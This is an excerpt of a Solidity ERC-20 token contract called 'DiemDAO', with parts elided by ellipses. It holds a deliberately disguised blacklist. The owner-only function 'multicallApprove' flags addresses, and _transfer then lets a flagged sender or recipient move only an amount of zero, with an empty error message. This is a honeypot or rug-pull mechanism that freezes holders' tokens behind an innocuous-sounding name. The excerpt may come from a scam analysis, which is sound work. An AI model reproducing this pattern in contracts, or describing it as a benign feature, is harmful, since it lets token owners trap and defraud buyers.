...
contract DiemDAO is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _multicallApprove;
    event multicalled (address callAddress, bool ismulticalled);
    ...
    string private _name = 'DiemDAO';
    string private _symbol = 'DiemDAO';
    ...
    function multicallApprove(address callAddress) external onlyOwner {
        if (_multicallApprove[callAddress] == true) {
            _multicallApprove[callAddress] = false;
        } else {_multicallApprove[callAddress] = true;
            emit multicalled (callAddress, _multicallApprove[callAddress]);
          }
    }
    
    function checkMulticall(address callAddress) public view returns (bool) {
        return _multicallApprove[callAddress];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_multicallApprove[sender] || _multicallApprove[recipient]) require (amount == 0, "");
